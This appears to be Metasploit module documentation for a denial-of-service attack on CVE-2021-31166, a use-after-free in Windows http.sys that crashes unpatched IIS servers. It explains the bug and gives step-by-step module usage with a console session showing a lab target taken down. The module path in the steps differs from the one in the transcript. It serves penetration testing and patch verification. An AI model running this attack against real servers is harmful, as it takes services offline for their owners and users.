## Vulnerable Application
Windows 10 and Windows Server version 20H2 and 2004 servers who do not
have KB5003173 installed to address CVE-2021-31166 are affected.

The vulnerability occurs due to a use-after-free (UAF) bug in `http.sys`'s `UlpParseContentCoding`
function whereby a local `LIST_ENTRY` item has items appended to it but the `LIST_ENTRY` structure
is not `NULL`'d out after it finished being used. An attacker can abuse this to trigger a code path
that free's every entry of the local `LIST_ENTRY` structure, which will be linked to in the `Request`
object this function uses to handle the incoming request. The `Request` object will then be used later
on in the code resulting in a UAF vulnerability.

Note that whilst this exploit tries to target IIS servers, in theory any
component that uses `http.sys` could be vulnerable, including client programs
which use `http.sys` to connect to servers.

The module itself will use this vulnerability to cause a invalid memory access exception error in `http.sys`
by sending a request with a specially crafted `Accept-Encoding` header to the target IIS server. Since
`http.sys` is a kernel module, this will result in a BSOD on the target system. This will cause IIS to go down
for a period of time until the server reboots and IIS restarts again.

## Verification Steps
1. Start `msfconsole`
1. `use exploit/windows/iis/http_sys_accept_encoding_dos_cve_2021_31166`
1. `set RHOST <ip>`
1. `exploit`
1. **Verify** that the target server is down.

## Options

### RHOST

 - **Required**
 - Type: **address**
 - *No default value*

IP address or hostname of the target IIS server.

### RPORT

 - **Required**
 - Type: **integer**
 - Default value: **80**

The port on the target server where IIS is running.

### TARGETURI

 - **Optional**
 - Type: **string**
 - Default value: **/**

The base URL of the IIS install on the target server.

## Scenarios

### Windows 10 20H2 Build 19042.685 With IIS Installed
```text
 ~/git/metasploit-framework │ iis_dos_cve2022_21907 ?18  ./msfconsole

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.1.34-dev-88b17b79fe               ]
+ -- --=[ 2209 exploits - 1171 auxiliary - 395 post       ]
+ -- --=[ 600 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can use help to view all
available commands

[*] Starting persistent handler(s)...
msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166
msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > show options
Module options (auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:hos
                                         t:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid
                                         7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI of the IIS Server.
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > set RHOSTS 172.22.216.145
RHOSTS => 172.22.216.145
msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > exploit
[*] Running module against 172.22.216.145

[*] Connecting to target to make sure its alive...
[+] Successfully connected to target. Sending payload...
[+] Payload was sent to the target server.
[*] Checking that the server is down...
[+] Target is down.
[*] Auxiliary module execution completed
msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) >
```

![Metasploit demonstration](https://mauricelambert.github.io/vulnerability/images/CVE-2021-31166_demo.gif "Metasploit demonstration")
